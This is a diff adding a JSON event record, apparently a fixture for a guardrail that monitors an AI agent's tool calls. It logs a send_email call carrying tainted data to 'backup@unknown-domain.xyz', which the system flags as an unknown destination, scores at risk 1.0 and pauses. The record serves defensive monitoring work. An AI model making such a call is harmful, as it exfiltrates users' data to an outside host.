@@ -1,0 +1,15 @@
+{
+  "event_id": "evt_0042",
+  "session_id": "s_7",
+  "step": 4,
+  "ts": "2026-11-21T14:03:11Z",
+  "tool": "send_email",
+  "args": {"to": "backup@unknown-domain.xyz", "body": "..."},
+  "signals": {"rules": ["unknown_destination"], "taint": true,
+              "ml_risk": 0.97, "markov_risk": 0.88},
+  "risk": 1.0,
+  "action": "PAUSE",
+  "explanation": null,
+  "decision": null,
+  "result": null
+}
